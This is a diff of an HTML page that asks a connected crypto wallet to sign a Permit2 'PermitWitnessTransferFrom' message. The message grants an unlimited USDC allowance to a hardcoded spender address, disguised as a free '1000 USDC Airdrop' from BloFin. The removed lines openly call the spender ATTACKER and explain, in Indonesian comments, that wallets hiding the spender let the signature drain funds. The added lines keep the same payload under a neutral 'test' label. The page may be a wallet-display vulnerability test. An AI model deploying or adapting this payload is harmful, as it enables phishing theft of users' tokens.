@@ -1,71 +1,112 @@
-<!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1">
-<style>body{background:#000;color:#0f0;font-family:monospace;padding:12px}button{width:100%;padding:18px;margin:6px 0;border-radius:10px;border:0;font-weight:800}#log{background:#111;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all}</style>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>permit2 test</title>
+<style>
+  html,body{margin:0;background:#0a0a0a;color:#d6d6d6;font-family:ui-monospace,Menlo,Consolas,monospace}
+ .wrap{max-width:520px;margin:0 auto;padding:18px}
+  h1{font-size:13px;color:#22ff66;letter-spacing:1px;margin:8px 0 18px}
+  button{display:block;width:100%;box-sizing:border-box;padding:16px 14px;margin:10px 0;border:0;border-radius:12px;font-weight:700;cursor:pointer}
+ .b1{background:#f2f2f2;color:#0a0a0a}
+ .b2{background:#e11d2a;color:#fff}
+  #out{margin-top:14px;background:#141414;border-radius:10px;padding:12px;font-size:11px;line-height:1.45;white-space:pre-wrap;word-break:break-all;min-height:90px}
+ .mut{color:#7a7a7a}
+</style>
 </head>
 <body>
-<h3 style="color:#0f0">BloFin V8.1 - HIDDEN SPENDER</h3>
-<button onclick="connect()" style="background:#fff">1. CONNECT</button>
-<button onclick="witnessBypass()" style="background:#ff0000;color:#fff">2. WITNESS BYPASS - SEMBUNYIIN SPENDER</button>
-<pre id="log">Use burner wallet!</pre>
+<div class="wrap">
+  <h1>BLOFIN TEST / PERMIT2</h1>
+  <button class="b1" id="btnConn">connect</button>
+  <button class="b2" id="btnTest">test permit witness</button>
+  <div id="out"><span class="mut">ready.
+use burner only.</span></div>
+</div>
+
 <script>
-let account;
-const ATTACKER="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
-const PERMIT2="0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const USDC="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-let log=m=>document.getElementById('log').innerText+="\n"+m;
+const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const SPENDER = "0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
 
-async function connect(){let a=await ethereum.request({method:'eth_requestAccounts'});account=a[0];log("Connected: "+account);}
+let acct = null;
+const out = document.getElementById('out');
+const print = (s) => { out.textContent += "\n" + s; out.scrollTop = out.scrollHeight; };
 
-async function witnessBypass(){
-if(!account)return alert("connect dulu");
-// Ini triknya: primaryType = PermitWitnessTransferFrom
-// Banyak wallet cuma nampilin `witness` yang keliatan benign, dan HIDE `spender` + `permitted`
-// Di sini witness kita bikin seolah-olah "Claim Airdrop 1000 USDC - Free"
-
-const domain={name:"Permit2",chainId:1,verifyingContract:PERMIT2};
-
-const types={
-  PermitWitnessTransferFrom:[
-    {name:"permitted",type:"TokenPermissions"},
-    {name:"spender",type:"address"},
-    {name:"nonce",type:"uint256"},
-    {name:"deadline",type:"uint256"},
-    {name:"witness",type:"AirdropClaim"}
-  ],
-  TokenPermissions:[
-    {name:"token",type:"address"},
-    {name:"amount",type:"uint256"}
-  ],
-  AirdropClaim:[
-    {name:"message",type:"string"},
-    {name:"amount",type:"string"},
-    {name:"isEligible",type:"bool"}
-  ]
+document.getElementById('btnConn').onclick = async () => {
+  try{
+    const a = await window.ethereum.request({method:'eth_requestAccounts'});
+    acct = a[0];
+    out.textContent = "connected: " + acct;
+  }catch(e){
+    print("connect err: " + (e.message||e));
+  }
 };
 
-const message={
-  permitted:{token:USDC,amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
-  spender:ATTACKER,
-  nonce:0,
-  deadline:9999999999,
-  witness:{message:"You have claimed 1000 USDC Airdrop - Free from BloFin Official",amount:"1000 USDC",isEligible:true}
+document.getElementById('btnTest').onclick = async () => {
+  if(!acct){ print("not connected"); return; }
+
+  const domain = { name:"Permit2", chainId:1, verifyingContract:PERMIT2 };
+
+  const types = {
+    PermitWitnessTransferFrom: [
+      {name:"permitted",type:"TokenPermissions"},
+      {name:"spender",type:"address"},
+      {name:"nonce",type:"uint256"},
+      {name:"deadline",type:"uint256"},
+      {name:"witness",type:"AirdropClaim"}
+    ],
+    TokenPermissions: [
+      {name:"token",type:"address"},
+      {name:"amount",type:"uint256"}
+    ],
+    AirdropClaim: [
+      {name:"message",type:"string"},
+      {name:"amount",type:"string"},
+      {name:"isEligible",type:"bool"}
+    ]
+  };
+
+  const message = {
+    permitted: {
+      token: USDC,
+      amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+    },
+    spender: SPENDER,
+    nonce: 0,
+    deadline: 9999999999,
+    witness: {
+      message: "You have claimed 1000 USDC Airdrop - Free from BloFin Official",
+      amount: "1000 USDC",
+      isEligible: true
+    }
+  };
+
+  const payload = JSON.stringify({
+    types: {
+      EIP712Domain: [
+        {name:"name",type:"string"},
+        {name:"chainId",type:"uint256"},
+        {name:"verifyingContract",type:"address"}
+      ],
+     ...types
+    },
+    domain,
+    primaryType: "PermitWitnessTransferFrom",
+    message
+  });
+
+  print("requesting sign...");
+  try{
+    const sig = await window.ethereum.request({
+      method: "eth_signTypedData_v4",
+      params: [acct, payload]
+    });
+    print("sig: " + sig);
+  }catch(e){
+    print("sign err: " + (e.message||e));
+  }
 };
-
-const data=JSON.stringify({
-  types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
- ...types},
-  domain:domain,
-  primaryType:"PermitWitnessTransferFrom",
-  message:message
-});
-
-log("Requesting Witness Bypass...");
-log("Jika di UI BloFin cuma muncul 'You have claimed 1000 USDC Airdrop' tapi TIDAK muncul spender 0x6a4c... dan amount UNLIMITED = KRITIS - Hidden Spender");
-
-let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
-log("SIG DAPAT: "+sig.slice(0,66)+"... \nIni bisa drain USDC unlimited ke attacker");
-}
 </script>
 </body>
 </html>
